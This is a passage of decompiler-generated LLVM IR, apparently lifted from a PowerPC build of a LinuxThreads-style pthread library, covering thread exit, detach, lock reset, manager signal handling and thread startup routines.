  br label %dec_label_pc_10007194

dec_label_pc_10007064:                            ; preds = %dec_label_pc_10007048
  %v1_10007064 = add i32 %v3_10006ff8, 44
  %v2_10007064 = inttoptr i32 %v1_10007064 to i8*
  %v3_10007064 = load i8, i8* %v2_10007064, align 1
  %v3_10007068 = icmp eq i8 %v3_10007064, 0
  br i1 %v3_10007068, label %dec_label_pc_10007070, label %dec_label_pc_10007128

dec_label_pc_10007070:                            ; preds = %dec_label_pc_10007064
  %v2_10007074 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268464252, i32* @lr, align 4
  %v2_10007078 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10006fb8, i32 %v2_10007074)
  %v1_10007080 = add i32 %v0_10006fb8, 66
  %v2_10007080 = inttoptr i32 %v1_10007080 to i8*
  %v3_10007080 = load i8, i8* %v2_10007080, align 1
  %v3_10007084 = icmp eq i8 %v3_10007080, 0
  br i1 %v3_10007084, label %dec_label_pc_100070a0, label %dec_label_pc_1000708c

dec_label_pc_1000708c:                            ; preds = %dec_label_pc_10007070
  store i32 1, i32* %r29.global-to-local, align 4
  %v1_10007094 = add i32 %v0_10006fb8, 64
  %v2_10007094 = inttoptr i32 %v1_10007094 to i8*
  %v3_10007094 = load i8, i8* %v2_10007094, align 1
  %v3_10007098 = icmp eq i8 %v3_10007094, 0
  br i1 %v3_10007098, label %dec_label_pc_100070ac, label %dec_label_pc_100070a0

dec_label_pc_100070a0:                            ; preds = %dec_label_pc_1000708c, %dec_label_pc_10007070
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_100070a8 = load i32, i32* @r31, align 4
  %v2_100070a8 = add i32 %v1_100070a8, 56
  %v3_100070a8 = inttoptr i32 %v2_100070a8 to i32*
  store i32 %v0_10006fb8, i32* %v3_100070a8, align 4
  br label %dec_label_pc_100070ac

dec_label_pc_100070ac:                            ; preds = %dec_label_pc_1000708c, %dec_label_pc_100070a0
  %v0_100070ac = load i32, i32* @r30, align 4
  store i32 %v0_100070ac, i32* @r3, align 4
  store i32 268464308, i32* @lr, align 4
  %v0_100070b0 = call i32 @__pthread_unlock()
  %v0_100070b4 = load i32, i32* %r29.global-to-local, align 4
  %v3_100070b4 = icmp eq i32 %v0_100070b4, 0
  store i32 %v0_10006fb8, i32* @r3, align 4
  br i1 %v3_100070b4, label %dec_label_pc_100070d4, label %dec_label_pc_100070bc

dec_label_pc_100070bc:                            ; preds = %dec_label_pc_100070ac
  store i32 268464328, i32* @lr, align 4
  %v2_100070c4 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10006fb8, i32 0)
  br label %dec_label_pc_10007118

dec_label_pc_100070d4:                            ; preds = %dec_label_pc_100070ac
  store i32 268464348, i32* @lr, align 4
  %v1_100070d8 = call i32 @suspend.3(i32 %v0_10006fb8)
  store i32 268464360, i32* @lr, align 4
  %v2_100070e4 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10006fb8, i32 0)
  %v1_100070ec = add i32 %v0_10006fb8, 440
  %v2_100070ec = inttoptr i32 %v1_100070ec to i8*
  %v3_100070ec = load i8, i8* %v2_100070ec, align 1
  %v3_100070f0 = icmp eq i8 %v3_100070ec, 0
  br i1 %v3_100070f0, label %dec_label_pc_1000711c, label %dec_label_pc_100070f8

dec_label_pc_100070f8:                            ; preds = %dec_label_pc_100070d4
  %v1_100070fc = add i32 %v0_10006fb8, 64
  %v2_100070fc = inttoptr i32 %v1_100070fc to i8*
  %v3_100070fc = load i8, i8* %v2_100070fc, align 1
  %v3_10007100 = icmp eq i8 %v3_100070fc, 0
  br i1 %v3_10007100, label %dec_label_pc_10007108, label %dec_label_pc_1000711c

dec_label_pc_10007108:                            ; preds = %dec_label_pc_100070f8
  store i8 0, i8* %v2_100070ec, align 1
  br label %dec_label_pc_10007118

dec_label_pc_10007118:                            ; preds = %dec_label_pc_100070bc, %dec_label_pc_10007108
  %v0_10007118 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_1000711c

dec_label_pc_1000711c:                            ; preds = %dec_label_pc_100070f8, %dec_label_pc_100070d4, %dec_label_pc_10007118
  store i32 %v0_10006fb8, i32* @r4, align 4
  %v0_10007120 = load i32, i32* @r30, align 4
  store i32 %v0_10007120, i32* @r3, align 4
  store i32 268464424, i32* @lr, align 4
  %v0_10007124 = call i32 @__pthread_lock()
  br label %dec_label_pc_10007128

dec_label_pc_10007128:                            ; preds = %dec_label_pc_10007064, %dec_label_pc_1000711c
  %v0_10007128 = load i32, i32* %r27.global-to-local, align 4
  %v3_10007128 = icmp eq i32 %v0_10007128, 0
  br i1 %v3_10007128, label %dec_label_pc_10007138, label %dec_label_pc_10007130

dec_label_pc_10007130:                            ; preds = %dec_label_pc_10007128
  %v0_10007130 = load i32, i32* @r31, align 4
  %v1_10007130 = add i32 %v0_10007130, 48
  %v2_10007130 = inttoptr i32 %v1_10007130 to i32*
  %v3_10007130 = load i32, i32* %v2_10007130, align 4
  %v2_10007134 = inttoptr i32 %v0_10007128 to i32*
  store i32 %v3_10007130, i32* %v2_10007134, align 4
  br label %dec_label_pc_10007138

dec_label_pc_10007138:                            ; preds = %dec_label_pc_10007128, %dec_label_pc_10007130
  %v0_10007138 = load i32, i32* @r30, align 4
  store i32 %v0_10007138, i32* @r3, align 4
  store i32 268464448, i32* @lr, align 4
  %v0_1000713c = call i32 @__pthread_unlock()
  %v3_10007144 = load i32, i32* @global_var_1002ef34.220, align 4
  %v1_10007148 = icmp slt i32 %v3_10007144, 0
  br i1 %v1_10007148, label %dec_label_pc_10007190, label %dec_label_pc_10007150

dec_label_pc_10007150:                            ; preds = %dec_label_pc_10007138
  store i32 %v0_10006fb8, i32* %stack_var_-172, align 4
  %v2_10007168 = ptrtoint i32* %stack_var_-172 to i32
  store i32 268464504, i32* @lr, align 4
  %v2_1000717412 = call i32 @__libc_write(i32 %v3_10007144, i32 %v2_10007168)
  %v3_1000717815 = icmp eq i32 %v2_1000717412, -1
  br i1 %v3_1000717815, label %dec_label_pc_10007180, label %dec_label_pc_10007190

dec_label_pc_10007180:                            ; preds = %dec_label_pc_10007150, %dec_label_pc_10007180.dec_label_pc_10007164_crit_edge
  %v0_10007180 = call i32 @__errno_location()
  %v1_10007184 = inttoptr i32 %v0_10007180 to i32*
  %v2_10007184 = load i32, i32* %v1_10007184, align 4
  %v3_10007188 = icmp eq i32 %v2_10007184, 4
  br i1 %v3_10007188, label %dec_label_pc_10007180.dec_label_pc_10007164_crit_edge, label %dec_label_pc_10007190

dec_label_pc_10007180.dec_label_pc_10007164_crit_edge: ; preds = %dec_label_pc_10007180
  %v3_1000716c.pre = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268464504, i32* @lr, align 4
  %v2_10007174 = call i32 @__libc_write(i32 %v3_1000716c.pre, i32 %v2_10007168)
  %v3_10007178 = icmp eq i32 %v2_10007174, -1
  br i1 %v3_10007178, label %dec_label_pc_10007180, label %dec_label_pc_10007190

dec_label_pc_10007190:                            ; preds = %dec_label_pc_10007150, %dec_label_pc_10007180, %dec_label_pc_10007180.dec_label_pc_10007164_crit_edge, %dec_label_pc_10007138
  br label %dec_label_pc_10007194

dec_label_pc_10007194:                            ; preds = %dec_label_pc_10007010, %dec_label_pc_10007054, %dec_label_pc_1000702c, %dec_label_pc_10007190
  %v0_100071a4 = phi i32 [ 3, %dec_label_pc_10007010 ], [ 22, %dec_label_pc_10007054 ], [ 35, %dec_label_pc_1000702c ], [ 0, %dec_label_pc_10007190 ]
  ret i32 %v0_100071a4

; uselistorder directives
  uselistorder i32 %v2_10007168, { 1, 0 }
  uselistorder i32 %v0_10006ff8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10006fd0, { 1, 0 }
  uselistorder i32 %v0_10006fb8, { 3, 4, 2, 7, 8, 6, 9, 5, 10, 1, 11, 12, 13, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32 268464504, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007194, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10007190, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10007180, { 1, 0 }
  uselistorder label %dec_label_pc_10007138, { 1, 0 }
  uselistorder label %dec_label_pc_10007128, { 1, 0 }
  uselistorder label %dec_label_pc_1000711c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007118, { 1, 0 }
  uselistorder label %dec_label_pc_100070ac, { 1, 0 }
  uselistorder label %dec_label_pc_10007054, { 1, 0 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %v0_100071b8 = call i32 @__pthread_do_exit()
  ret i32 %v0_100071b8
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100071c4 = load i32, i32* @r2, align 4
  store i32 %v0_100071c4, i32* @r4, align 4
  store i32 268464604, i32* @lr, align 4
  %v0_100071d8 = call i32 @__pthread_lock()
  %v1_100071dc = add i32 %arg1, 8
  %v2_100071dc = inttoptr i32 %v1_100071dc to i32*
  %v3_100071dc = load i32, i32* %v2_100071dc, align 4
  store i32 %arg1, i32* @r3, align 4
  %v1_100071e8 = add i32 %v3_100071dc, 56
  %v2_100071e8 = inttoptr i32 %v1_100071e8 to i32*
  %v3_100071e8 = load i32, i32* %v2_100071e8, align 4
  store i32 %v3_100071e8, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_100071e8, align 4
  %v0_100071f0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100071f0 = icmp ne i32 %v0_100071f0, 0
  %v5_100071f4 = zext i1 %v2_100071f0 to i32
  store i32 268464636, i32* @lr, align 4
  %v0_100071f8 = call i32 @__pthread_unlock()
  ret i32 %v5_100071f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  %v1_10007230 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10007234 = add i32 %v1_10007230, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10007234, i32* @r3, align 4
  store i32 268464708, i32* @lr, align 4
  %v0_10007240 = call i32 @__pthread_lock()
  %v0_10007244 = load i32, i32* @r31, align 4
  %v1_10007244 = add i32 %v0_10007244, 8
  %v2_10007244 = inttoptr i32 %v1_10007244 to i32*
  %v3_10007244 = load i32, i32* %v2_10007244, align 4
  %v3_10007248 = icmp eq i32 %v3_10007244, 0
  br i1 %v3_10007248, label %dec_label_pc_1000725c, label %dec_label_pc_10007250

dec_label_pc_10007250:                            ; preds = %entry
  %v1_10007250 = add i32 %v3_10007244, 16
  %v2_10007250 = inttoptr i32 %v1_10007250 to i32*
  %v3_10007250 = load i32, i32* %v2_10007250, align 4
  %v0_10007254 = load i32, i32* @r30, align 4
  %v4_10007254 = icmp eq i32 %v0_10007254, %v3_10007250
  br i1 %v4_10007254, label %dec_label_pc_1000726c, label %dec_label_pc_1000725c

dec_label_pc_1000725c:                            ; preds = %dec_label_pc_10007250, %entry
  store i32 %v0_10007244, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007264.289 to i32), i32* @lr, align 4
  %v0_10007260 = call i32 @__pthread_unlock()
  br label %dec_label_pc_1000730c

dec_label_pc_1000726c:                            ; preds = %dec_label_pc_10007250
  %v1_1000726c = add i32 %v3_10007244, 45
  %v2_1000726c = inttoptr i32 %v1_1000726c to i8*
  %v3_1000726c = load i8, i8* %v2_1000726c, align 1
  %v3_10007270 = icmp eq i8 %v3_1000726c, 0
  br i1 %v3_10007270, label %dec_label_pc_10007288, label %dec_label_pc_10007278

dec_label_pc_10007278:                            ; preds = %dec_label_pc_1000726c
  store i32 %v0_10007244, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007280.290 to i32), i32* @lr, align 4
  %v0_1000727c = call i32 @__pthread_unlock()
  br label %dec_label_pc_1000730c

dec_label_pc_10007288:                            ; preds = %dec_label_pc_1000726c
  %v1_10007288 = add i32 %v3_10007244, 56
  %v2_10007288 = inttoptr i32 %v1_10007288 to i32*
  %v3_10007288 = load i32, i32* %v2_10007288, align 4
  %v3_1000728c = icmp eq i32 %v3_10007288, 0
  br i1 %v3_1000728c, label %dec_label_pc_100072a0, label %dec_label_pc_10007294

dec_label_pc_10007294:                            ; preds = %dec_label_pc_10007288
  store i32 %v0_10007244, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000729c.291 to i32), i32* @lr, align 4
  %v0_10007298 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10007308

dec_label_pc_100072a0:                            ; preds = %dec_label_pc_10007288
  %v1_100072a4 = add i32 %v3_10007244, 44
  %v2_100072a4 = inttoptr i32 %v1_100072a4 to i8*
  %v3_100072a4 = load i8, i8* %v2_100072a4, align 1
  %v4_100072a4 = zext i8 %v3_100072a4 to i32
  store i32 %v4_100072a4, i32* %r29.global-to-local, align 4
  store i8 1, i8* %v2_1000726c, align 1
  %v0_100072ac = load i32, i32* @r31, align 4
  store i32 %v0_100072ac, i32* @r3, align 4
  store i32 268464820, i32* @lr, align 4
  %v0_100072b0 = call i32 @__pthread_unlock()
  %v0_100072b4 = load i32, i32* %r29.global-to-local, align 4
  %v3_100072b4 = icmp eq i32 %v0_100072b4, 0
  br i1 %v3_100072b4, label %dec_label_pc_10007308, label %dec_label_pc_100072bc

dec_label_pc_100072bc:                            ; preds = %dec_label_pc_100072a0
  %v3_100072c0 = load i32, i32* @global_var_1002ef34.220, align 4
  %v1_100072c4 = icmp slt i32 %v3_100072c0, 0
  br i1 %v1_100072c4, label %dec_label_pc_10007308, label %dec_label_pc_100072cc

dec_label_pc_100072cc:                            ; preds = %dec_label_pc_100072bc
  %v0_100072d8 = load i32, i32* @r2, align 4
  store i32 %v0_100072d8, i32* %stack_var_-184, align 4
  %v2_100072e0 = ptrtoint i32* %stack_var_-184 to i32
  store i32 268464880, i32* @lr, align 4
  %v2_100072ec8 = call i32 @__libc_write(i32 %v3_100072c0, i32 %v2_100072e0)
  %v3_100072f011 = icmp eq i32 %v2_100072ec8, -1
  br i1 %v3_100072f011, label %dec_label_pc_100072f8, label %dec_label_pc_10007308

dec_label_pc_100072f8:                            ; preds = %dec_label_pc_100072cc, %dec_label_pc_100072f8.dec_label_pc_100072dc_crit_edge
  %v0_100072f8 = call i32 @__errno_location()
  %v1_100072fc = inttoptr i32 %v0_100072f8 to i32*
  %v2_100072fc = load i32, i32* %v1_100072fc, align 4
  %v3_10007300 = icmp eq i32 %v2_100072fc, 4
  br i1 %v3_10007300, label %dec_label_pc_100072f8.dec_label_pc_100072dc_crit_edge, label %dec_label_pc_10007308

dec_label_pc_100072f8.dec_label_pc_100072dc_crit_edge: ; preds = %dec_label_pc_100072f8
  %v3_100072e4.pre = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268464880, i32* @lr, align 4
  %v2_100072ec = call i32 @__libc_write(i32 %v3_100072e4.pre, i32 %v2_100072e0)
  %v3_100072f0 = icmp eq i32 %v2_100072ec, -1
  br i1 %v3_100072f0, label %dec_label_pc_100072f8, label %dec_label_pc_10007308

dec_label_pc_10007308:                            ; preds = %dec_label_pc_100072cc, %dec_label_pc_100072f8, %dec_label_pc_100072f8.dec_label_pc_100072dc_crit_edge, %dec_label_pc_100072bc, %dec_label_pc_100072a0, %dec_label_pc_10007294
  br label %dec_label_pc_1000730c

dec_label_pc_1000730c:                            ; preds = %dec_label_pc_10007278, %dec_label_pc_1000725c, %dec_label_pc_10007308
  %v0_1000731c = phi i32 [ 22, %dec_label_pc_10007278 ], [ 3, %dec_label_pc_1000725c ], [ 0, %dec_label_pc_10007308 ]
  ret i32 %v0_1000731c

; uselistorder directives
  uselistorder i32 %v2_100072e0, { 1, 0 }
  uselistorder i32 %v0_10007244, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 268464880, { 1, 0 }
  uselistorder label %dec_label_pc_1000730c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007308, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_100072f8, { 1, 0 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_1000732c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000732c, i32* %r29.global-to-local, align 4
  %v2_10007338 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-40)
  %v3_10007344 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-40, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_1000735c4 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000735c4, label %dec_label_pc_10007370, label %dec_label_pc_10007354

dec_label_pc_10007354:                            ; preds = %entry, %dec_label_pc_10007354
  %v1_100073647.in = phi i32 [ %storemerge, %dec_label_pc_10007354 ], [ %storemerge1, %entry ]
  %v1_100073647 = add i32 %v1_100073647.in, 56
  %v3_10007354 = call i32 @pthread_mutex_init(i32 %v1_100073647, i32* nonnull %stack_var_-40)
  %v0_10007358 = load i32, i32* %r29.global-to-local, align 4
  %v1_10007358 = add i32 %v0_10007358, 32
  %v2_10007358 = inttoptr i32 %v1_10007358 to i32*
  %storemerge = load i32, i32* %v2_10007358, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_1000735c = icmp eq i32 %storemerge, 0
  br i1 %v3_1000735c, label %dec_label_pc_10007370, label %dec_label_pc_10007354

dec_label_pc_10007370:                            ; preds = %dec_label_pc_10007354, %entry
  %v1_10007374 = call i32 @pthread_mutexattr_destroy(i32 %v2_1000732c)
  ret i32 %v1_10007374

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007354, { 1, 0 }
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r31, align 4
  %v3_100073a8 = load i32, i32* @global_var_1002a958.292, align 4
  %v3_100073ac = icmp slt i32 %v3_100073a8, %arg1
  br i1 %v3_100073ac, label %dec_label_pc_100073b4, label %dec_label_pc_100073e8

dec_label_pc_100073b4:                            ; preds = %entry
  store i32 268465080, i32* @lr, align 4
  %v1_100073b4 = call i32 @sched_get_priority_max(i32 1)
  %v0_100073cc = call i32 @__asm_mfcr()
  %v1_100073d0 = call i32 @__asm_rlwinm(i32 %v0_100073cc, i32 29, i32 31, i32 31)
  store i32 268465124, i32* @lr, align 4
  %v0_100073e0 = call i32 @sched_setscheduler()
  %v0_100073e4 = load i32, i32* @r31, align 4
  store i32 %v0_100073e4, i32* @global_var_1002a958.292, align 4
  br label %dec_label_pc_100073e8

dec_label_pc_100073e8:                            ; preds = %entry, %dec_label_pc_100073b4
  %v0_100073f8 = phi i32 [ 1, %entry ], [ %v0_100073e0, %dec_label_pc_100073b4 ]
  ret i32 %v0_100073f8

; uselistorder directives
  uselistorder label %dec_label_pc_100073e8, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %v3_1000740c = load i32, i32* @global_var_1002f020.293, align 4
  %v3_10007414 = icmp eq i32 %v3_1000740c, 0
  br i1 %v3_10007414, label %dec_label_pc_1000741c, label %dec_label_pc_10007430

dec_label_pc_1000741c:                            ; preds = %entry
  br label %dec_label_pc_10007430

dec_label_pc_10007430:                            ; preds = %entry, %dec_label_pc_1000741c
  %v0_10007430 = phi i1 [ false, %dec_label_pc_1000741c ], [ true, %entry ]
  store i32 1, i32* @global_var_1002f020.293, align 4
  br i1 %v0_10007430, label %dec_label_pc_10007430.dec_label_pc_10007480_crit_edge, label %dec_label_pc_10007444

dec_label_pc_10007430.dec_label_pc_10007480_crit_edge: ; preds = %dec_label_pc_10007430
  %v0_1000748c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007480

dec_label_pc_10007444:                            ; preds = %dec_label_pc_10007430
  store i32 0, i32* %stack_var_-168, align 4
  %v2_10007458 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10007454

dec_label_pc_10007454:                            ; preds = %dec_label_pc_10007470, %dec_label_pc_10007444
  %v3_1000745c = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268465256, i32* @lr, align 4
  %v2_10007464 = call i32 @__libc_write(i32 %v3_1000745c, i32 %v2_10007458)
  %v3_10007468 = icmp eq i32 %v2_10007464, -1
  br i1 %v3_10007468, label %dec_label_pc_10007470, label %dec_label_pc_10007480

dec_label_pc_10007470:                            ; preds = %dec_label_pc_10007454
  %v0_10007470 = call i32 @__errno_location()
  %v1_10007474 = inttoptr i32 %v0_10007470 to i32*
  %v2_10007474 = load i32, i32* %v1_10007474, align 4
  %v3_10007478 = icmp eq i32 %v2_10007474, 4
  br i1 %v3_10007478, label %dec_label_pc_10007454, label %dec_label_pc_10007480

dec_label_pc_10007480:                            ; preds = %dec_label_pc_10007454, %dec_label_pc_10007470, %dec_label_pc_10007430.dec_label_pc_10007480_crit_edge
  %v0_1000748c = phi i32 [ %v0_1000748c.pre, %dec_label_pc_10007430.dec_label_pc_10007480_crit_edge ], [ %v2_10007464, %dec_label_pc_10007454 ], [ %v0_10007470, %dec_label_pc_10007470 ]
  ret i32 %v0_1000748c

; uselistorder directives
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder label %dec_label_pc_10007480, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007430, { 1, 0 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100074d8:
  %v3_100074d8 = icmp eq i32 %arg2, 0
  br i1 %v3_100074d8, label %dec_label_pc_100074e8, label %dec_label_pc_100074e0

dec_label_pc_100074e0:                            ; preds = %dec_label_pc_100074d8
  %v3_100074ac = load i32, i32* @global_var_1002ef30, align 4
  %v1_100074e0 = add i32 %v3_100074ac, 20
  %v2_100074e0 = inttoptr i32 %v1_100074e0 to i32*
  %v3_100074e0 = load i32, i32* %v2_100074e0, align 4
  store i32 268465384, i32* @lr, align 4
  %v2_100074e4 = call i32 @kill(i32 %v3_100074e0, i32 %arg1)
  br label %dec_label_pc_100074e8

dec_label_pc_100074e8:                            ; preds = %dec_label_pc_100074d8, %dec_label_pc_100074e0
  %v0_100074f8 = phi i32 [ %arg1, %dec_label_pc_100074d8 ], [ %v2_100074e4, %dec_label_pc_100074e0 ]
  ret i32 %v0_100074f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100074e8, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268465432, i32* @lr, align 4
  %v0_10007514 = call i32 @__libc_getpid()
  %v1_10007518 = load i32, i32* @r31, align 4
  %v2_10007518 = add i32 %v1_10007518, 20
  %v3_10007518 = inttoptr i32 %v2_10007518 to i32*
  store i32 %v0_10007514, i32* %v3_10007518, align 4
  %v0_1000751c = load i32, i32* @r31, align 4
  %v1_1000751c = add i32 %v0_1000751c, 100
  store i32 268465452, i32* @lr, align 4
  %v3_10007528 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_1000751c, i32 0)
  %v0_1000752c = load i32, i32* @r31, align 4
  %v1_1000752c = add i32 %v0_1000752c, 228
  %v2_1000752c = inttoptr i32 %v1_1000752c to i32*
  %v3_1000752c = load i32, i32* %v2_1000752c, align 4
  %v1_10007530 = icmp slt i32 %v3_1000752c, 0
  br i1 %v1_10007530, label %dec_label_pc_10007544, label %dec_label_pc_10007538

dec_label_pc_10007538:                            ; preds = %entry
  br label %dec_label_pc_10007568

dec_label_pc_10007544:                            ; preds = %entry
  %v3_10007548 = load i32, i32* @global_var_1002a958.292, align 4
  %tmp7 = icmp slt i32 %v3_10007548, 1
  br i1 %tmp7, label %dec_label_pc_1000756c, label %dec_label_pc_10007554

dec_label_pc_10007554:                            ; preds = %dec_label_pc_10007544
  br label %dec_label_pc_10007568

dec_label_pc_10007568:                            ; preds = %dec_label_pc_10007538, %dec_label_pc_10007554
  store i32 268465516, i32* @lr, align 4
  %v0_10007568 = call i32 @sched_setscheduler()
  br label %dec_label_pc_1000756c

dec_label_pc_1000756c:                            ; preds = %dec_label_pc_10007544, %dec_label_pc_10007568
  %v3_10007570 = load i32, i32* @global_var_1002f03c.256, align 4
  %v3_10007574 = icmp eq i32 %v3_10007570, 0
  br i1 %v3_10007574, label %dec_label_pc_100075cc, label %dec_label_pc_1000757c

dec_label_pc_1000757c:                            ; preds = %dec_label_pc_1000756c
  %v3_10007580 = load i32, i32* @global_var_1002ef5c.230, align 4
  %tmp8 = icmp slt i32 %v3_10007580, 1
  br i1 %tmp8, label %dec_label_pc_100075cc, label %dec_label_pc_1000758c

dec_label_pc_1000758c:                            ; preds = %dec_label_pc_1000757c
  %v0_10007590 = load i32, i32* @r31, align 4
  store i32 %v0_10007590, i32* %stack_var_-164, align 4
  %v2_1000759c = ptrtoint i32* %stack_var_-164 to i32
  br label %dec_label_pc_10007598

dec_label_pc_10007598:                            ; preds = %dec_label_pc_100075b4, %dec_label_pc_1000758c
  %v3_100075a0 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268465580, i32* @lr, align 4
  %v2_100075a8 = call i32 @__libc_write(i32 %v3_100075a0, i32 %v2_1000759c)
  %v3_100075ac = icmp eq i32 %v2_100075a8, -1
  br i1 %v3_100075ac, label %dec_label_pc_100075b4, label %dec_label_pc_100075c4

dec_label_pc_100075b4:                            ; preds = %dec_label_pc_10007598
  %v0_100075b4 = call i32 @__errno_location()
  %v1_100075b8 = inttoptr i32 %v0_100075b4 to i32*
  %v2_100075b8 = load i32, i32* %v1_100075b8, align 4
  %v3_100075bc = icmp eq i32 %v2_100075b8, 4
  br i1 %v3_100075bc, label %dec_label_pc_10007598, label %dec_label_pc_100075c4

dec_label_pc_100075c4:                            ; preds = %dec_label_pc_10007598, %dec_label_pc_100075b4
  %v0_100075c4 = load i32, i32* @r31, align 4
  store i32 %v0_100075c4, i32* @r3, align 4
  store i32 268465612, i32* @lr, align 4
  %v0_100075c8 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_100075cc

dec_label_pc_100075cc:                            ; preds = %dec_label_pc_1000757c, %dec_label_pc_1000756c, %dec_label_pc_100075c4
  %v0_100075cc = load i32, i32* @r31, align 4
  %v1_100075d0 = add i32 %v0_100075cc, 92
  %v2_100075d0 = inttoptr i32 %v1_100075d0 to i32*
  %v3_100075d0 = load i32, i32* %v2_100075d0, align 4
  call void @__pseudo_call(i32 %v3_100075d0)
  %v0_100075e0 = call i32 @__pthread_do_exit()
  ret i32 %v0_100075e0

; uselistorder directives
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @sched_setscheduler, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100075cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100075c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000756c, { 1, 0 }
  uselistorder label %dec_label_pc_10007568, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268465664, i32* @lr, align 4
  %v0_100075fc = call i32 @__libc_getpid()
  %v1_10007600 = load i32, i32* @r29, align 4
  %v2_10007600 = add i32 %v1_10007600, 20
  %v3_10007600 = inttoptr i32 %v2_10007600 to i32*
  store i32 %v0_100075fc, i32* %v3_10007600, align 4
  store i32 0, i32* @r4, align 4
  %v0_10007608 = load i32, i32* @r29, align 4
  %v1_10007608 = add i32 %v0_10007608, 28
  %v2_10007608 = inttoptr i32 %v1_10007608 to i32*
  %v3_10007608 = load i32, i32* %v2_10007608, align 4
  store i32 %v3_10007608, i32* @r3, align 4
  store i32 268465680, i32* @lr, align 4
  %v0_1000760c = call i32 @__pthread_lock()
  %v0_10007610 = load i32, i32* @r29, align 4
  %v1_10007610 = add i32 %v0_10007610, 28
  %v2_10007610 = inttoptr i32 %v1_10007610 to i32*
  %v3_10007610 = load i32, i32* %v2_10007610, align 4
  store i32 %v3_10007610, i32* @r3, align 4
  store i32 268465688, i32* @lr, align 4
  %v0_10007614 = call i32 @__pthread_unlock()
  %v0_10007618 = load i32, i32* @r29, align 4
  %v1_1000761c = call i32 @pthread_start_thread(i32 %v0_10007618)
  ret i32 %v1_1000761c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v1_10007640 = add i32 %arg1, 16
  %v2_10007640 = inttoptr i32 %v1_10007640 to i32*
  %v3_10007640 = load i32, i32* %v2_10007640, align 4
